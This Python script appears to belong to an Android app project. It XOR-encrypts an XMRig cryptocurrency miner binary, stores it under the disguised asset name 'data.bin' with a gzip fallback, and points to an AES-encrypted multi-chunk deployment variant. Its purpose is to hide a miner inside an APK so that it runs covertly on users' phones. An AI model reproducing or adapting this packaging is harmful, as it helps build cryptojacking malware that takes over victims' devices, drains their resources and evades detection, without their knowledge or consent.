#!/usr/bin/env python3
"""
Usage: python encrypt_miner.py [xmrig_elf_path] [--key KEY]

XOR-encrypts XMRig binary for embedding as assets/data.bin.
If no binary given, generates a placeholder.

Output: app/src/main/assets/data.bin
        app/src/main/assets/libxmrig.so.gz (fallback, gzip-compressed)

For AES-256-GCM encrypted multi-chunk deployment (preferred), use:
    python prepare_miner.py /path/to/xmrig
"""
import sys, os, gzip
from pathlib import Path

ASSETS_DIR = Path("app/src/main/assets")
DATA_BIN = ASSETS_DIR / "data.bin"
FALLBACK_GZ = ASSETS_DIR / "libxmrig.so.gz"

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def main():
    binary = None
    key = os.urandom(32)
    args = sys.argv[1:]
    while args:
        if args[0] == "--key" and len(args) > 1:
            key = bytes.fromhex(args[1].removeprefix("0x"))
            args = args[2:]
        else:
            binary = args[0]
            args = args[1:]

    ASSETS_DIR.mkdir(parents=True, exist_ok=True)

    if binary and Path(binary).exists():
        data = Path(binary).read_bytes()
        print(f"Encrypting: {binary} ({len(data)} bytes)")
    else:
        print("No binary — generating placeholder (4MB)")
        data = os.urandom(4 * 1024 * 1024)

    encrypted = xor_encrypt(data, key)
    DATA_BIN.write_bytes(encrypted)
    print(f"Wrote {DATA_BIN} ({len(encrypted)} bytes)")

    gz_data = gzip.compress(data)
    FALLBACK_GZ.write_bytes(gz_data)
    print(f"Wrote {FALLBACK_GZ} ({len(gz_data)} bytes)")

    print(f"XOR key (hex, store in MinerConfig or discard for placeholder): {key.hex()}")
    print("=" * 50)
    print("Done. Rebuild the APK.")
    print(f"Replace with real XMRig: python {__file__} /path/to/xmrig")

if __name__ == "__main__":
    main()
